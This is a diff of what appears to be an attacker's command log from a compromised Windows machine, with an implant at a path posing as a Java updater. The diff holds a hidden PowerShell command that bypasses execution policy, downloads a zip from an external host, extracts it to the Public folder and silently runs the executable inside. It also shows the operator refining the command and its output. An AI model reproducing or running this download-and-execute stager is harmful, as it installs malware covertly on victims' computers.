@@ -1,4 +1,4 @@
-2026-08-28T12:36:05.4142453
+2026-08-28T12:39:22.6798192
 
 DESKTOP-9ISASHE / afzan
 
@@ -8,6 +8,12 @@ C:\Users\afzan\AppData\Local\Oracle\JavaUpdate\javeeee.exe
 
 
 
-CMD[1/1] powershell -NoP -W Hidden -EP Bypass -Command $u='https://staging.d1yxos5modoo20.amplifyapp.com/window.zip';$d=$env:Public+'\win.zip';$o=$env:Public+'\windir';(New-Object Net.WebClient).DownloadFile($u,$d);if(Test-Path $o){Remove-Item $o -Recurse -Force};Expand-Archive $d $o -Force;$e=@(Get-ChildItem ($o+'\*.exe') -Recurse)[0].FullName;$p=New-Object System.Diagnostics.ProcessStartInfo;$p.FileName=$e;$p.WorkingDirectory=$o;$p.UseShellExecute=$false;$p.CreateNoWindow=$true;[System.Diagnostics.Process]::Start($p)|Out-Null;echo('started '+$e)
-'Out-Null' is not recognized as an internal or external command,
-operable program or batch file.
+CMD[1/1] powershell -NoP -W Hidden -EP Bypass -Command $u='https://staging.d1yxos5modoo20.amplifyapp.com/window.zip';$d=$env:Public+'\win.zip';$o=$env:Public+'\windir';(New-Object Net.WebClient).DownloadFile($u,$d);if(Test-Path $o){Remove-Item $o -Recurse -Force};Expand-Archive $d $o -Force;$e=@(Get-ChildItem ($o+'\*.exe') -Recurse)[0].FullName;$p=New-Object System.Diagnostics.ProcessStartInfo;$p.FileName=$e;$p.WorkingDirectory=$o;$p.UseShellExecute=$false;$p.CreateNoWindow=$true;$null=[System.Diagnostics.Process]::Start($p);echo('started '+$e)
+Exception calling "Start" with "1" argument(s): "The requested operation requires elevation"
+At line:1 char:431
++ ... eNoWindow=$true;$null=[System.Diagnostics.Process]::Start($p);echo('s ...
++                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : Win32Exception
+ 
+started C:\Users\Public\windir\window.exe
